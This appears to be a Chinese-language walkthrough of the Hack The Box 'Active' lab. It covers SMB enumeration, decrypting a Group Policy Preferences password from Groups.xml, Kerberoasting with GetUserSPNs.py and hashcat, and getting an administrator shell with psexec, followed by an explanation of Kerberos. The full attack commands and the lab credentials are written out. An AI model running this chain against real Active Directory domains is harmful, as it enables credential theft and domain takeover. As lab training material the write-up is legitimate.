## 前言

最近在看一些内网的手法，我将会打一些HTB的内网靶场，并且详细记录背后的涉及到的知识点。

## 信息收集

    
    
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 00:08 EDT
    Nmap scan report for 10.10.10.100
    Host is up (0.27s latency).
    Not shown: 982 closed tcp ports (conn-refused)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-26 04:10:06Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  unknown
    49165/tcp open  unknown
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 124.85 seconds

## GPP密码获取及解密

发现一些信息  
netbios-ssn 139端口  
kerberos-sec 88 端口  
ldap 389端口  
smb 445端口  
关于 netbios-ssn (网络基本输入输出系统)

> 当 NETBIOS 运行时，NETBIOS不光允许局域网内的用户访问你的硬盘资源，INTERNET上的黑客也能进入，  
>  可用 NBTSTAT -A IP 命令来检测是否开放 NETBEUI 端口，从而从中获得计算机的一些信息，  
>  如机器名、工作组模式 以及MAC地址。

这里 我们可以进行SMB(网络文件共享系统)枚举 使用工具SMBmap

>
> 允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至远程执行命令。

![](./img/8627569730892723967.png)

可以看到 只有Replication 允许读取  
尝试使用smbclient访问读取  
`smbclient //10.10.10.100/Replication`  
在目录`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`  
存在文件Groups.xml

> GPP是Group Policy
> Preferences（组策略首选项）的缩写，这是一个组策略实施工具。通过该工具，网络管理员可以实现更多的网络管理，如驱动映射、添加计划任务、管理本地组和用户。其中最常用的功能就是远程创建本地账户。在创建过程中，会在目标主机传送一个Groups.xml文件。该文件中保存这创建的用户名和加密的密码。该加密的密码采用对称加密。  
>  该文件是通过网络传输到目标主机的。通过数据抓包，就可以截获该文件。然后使用Kali Linux提供工具gpp-decrypt来破解该密码。工具gpp-> decrypt是一个Ruby脚本，可以直接破解GPP加密的密码

![](./img/1826468785253315739.png)

里面是SC_TGS用户及其GPP密码

    
    
    active.htb\SVC_TGS
    edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

使用kali自带的工具gpp-decrypt解密密码

![](./img/6619993221689177918.png)

GPPstillStandingStrong2k18  
自此我们get到了一个域用户的账号和明文密码。  
之后我们使用账户密码通过crackmapexec 继续进行SMB的枚举  
`crackmapexec smb 10.10.10.100 -u "active.htb\SVC_TGS" -p
"GPPstillStandingStrong2k18" --shares`

![](./img/5301857862689635765.png)

这里不知道为什么不能用  
我使用smbmap枚举  
`smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18`

![](./img/890793851665596572.png)  
发现下面四项均可读  
使用smbclient连接读取即可  
`smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18`

![](./img/1403762562989308175.png)

SVC_TGS目录下的Desktop 的user.txt即为普通用户flag

## kerberoasting攻击

这里关于kerberoasting攻击的原理和kerberoas的攻击 将会在文章后详述，这一阶段只讲述如何get rootflag  
我们已经get到了SVC_TGS用户账户 和它的ST 我们可以使用Impacket
中的脚本GetUserSPNs.py（该脚本可以请求注册于用户下的所有SPN的服务票据）来获取SVC_TGS用户帐户的SPN

`GetUserSPNs.py -request -dc-ip 10.10.10.100
active.htb/SVC_TGS:GPPstillStandingStrong2k18`  
这里我使用的本机

![](./img/977793210742918455.png)

接下来把ST票据保存到hash中 使用hashcat进行解密

    
    
    hashcat --example-hashes |grep krb5tgs -A5 -B5           #查看我们破解该票据要调用的模块
    hashcat -m 13100 hash /usr/share/wordlist/rokyou.txt --force         #开始破解

解密出来的管理员的明文密码Ticketmaster1968  
使用 psexec getshell  
psexec.py Administrator:Ticketmaster1968@10.10.10.100

![](./img/2769018021685085747.png)

## 关于kerberos和kerberoasting攻击

在域渗透中，Kerberos是最常用的 。

### kerberos基础认证流程

首先是几个概念

>   * KDC（Key Distribution Center）= 密钥分发中心
>   * AS（Authentication Service）= 认证用户的身份，并为其发放TGT的服务
>   * TGT（Ticket Granting Ticket）= TGT认证票据，由AS服务发放
>   * TGS（Ticket Granting Service）= 票据发放服务
>   * ST（Service Tickets）= ST服务票据，由TGS服务发送
>   * AP（Application Server）= 提供用户所需的服务
>

这里我引用《内网渗透体系建设》的Kerberos基础认证过程图

![](./img/6406341418756575788.png)

> 解释如下:  
>  1.AS_REQ。Client向 AS发起AS_REQ，请求内容为通过Client的哈希加密的时间戳、ClientID等内容。  
>  2.AS_REP。AS使用Client密码哈希值进行解密，如果解密正确，就返回用krbtgt的 NTLM-hash加密的TGT (Ticket
> Granting Ticket，票据授权凭证）票据。TGT包含PAC(Privilege Attribute
> Certificate，特权属证书)，PAC包含Client的相关权限信息，如SID及所在的组。简单理解，PAC就是用于验证用户权限，只有KDC能制作和查看PAC  
>  3.TGS_REQ。Client 凭借TGT向TGS发起针对需要访问服务的TGS_REQ请求。  
>  4.TGS_REP。TGS使用krbtgt的NTLM-hash对TGT进行解密，如果结果正确就返回用服务NTLM-hash 加密的TGS
> 票据（简称ST)，并带上 PAC。注意，在Kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT 正确，就会返回ST。  
>  5.AP_REQ。Client利用ST去请求服务  
>  6.AP_REP。服务使用自己的NTLM-hash解密ST。如果解密正确，就会将其中的PAC给
> KDC解密，KDC由此判断Client是否有访问服务的权限。当然，如果没有设置PAC，就不会去KDC求证。

在这个过程中会延伸出许多的攻击手法，比如白银黄金票据，委派攻击，密码喷洒等攻击手法。  
而kerberoasting攻击 正是处于TGS_REQ和TGS_REP之间的攻击

### kerberoasting解析

#### 关于SPN

> SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。  
>  Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos
> 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的
> SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN
> 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。

简单的说 SPN是服务实例的唯一标识符，每一个服务实例必须有自己的SPN。  
当客户端使用多个名称进行验证时，服务实例可以有多个SPN.  
SPN始终包含运行服务实例的主机名称，服务实例可以为其主机的每一个名称或者别名注册SPN  
一个账户可以有多个SPN，但是一个SPN只能被注册到一个账户。  
**实例：**  
某用户访问Redis服务时，需要先向KDC的AS发送请求获得TGT，获得TGT后可以向TGS发送TGT和需要请求服务的SPN，当TGS对TGT解密验证成功后，TGS会将允许访问SPN对应的服务的ST和该SPN对应的服务地址返回。用户拿着ST票据可以访问Redis服务

#### Kerberoast攻击过程

1.攻击者必须拥有TGT，用于后续请求获得ST  
2.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。然后，DC查找哪个帐户在
ServicedPrincipalName (服务主体名称)字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN
的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。然后返回ST  
3.由于ST是由注册了请求的SPN账户的NTLM哈希进行加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码

## 思路小结

1，目标主机开启了 netbios服务，使用smbmap枚举可读文件发现文件Groups.xml  
2，获取一个用户和它的明文密码  
3，通过工具Impacket中的GetUserSPNS.py，获得此用户下的所有SPN的ST  
4，解密ST获得 NTLM hash get明文密码

## Ref

《内网渗透体系建设》  
<https://www.freebuf.com/articles/web/346768.html>  
<https://zhuanlan.zhihu.com/p/475122515>  
[https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&idx=1&mid=2247488936&scene=21&sn=82c127c8ad6d3e36f1a977e5ba122228#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&idx=1&mid=2247488936&scene=21&sn=82c127c8ad6d3e36f1a977e5ba122228#wechat_redirect)

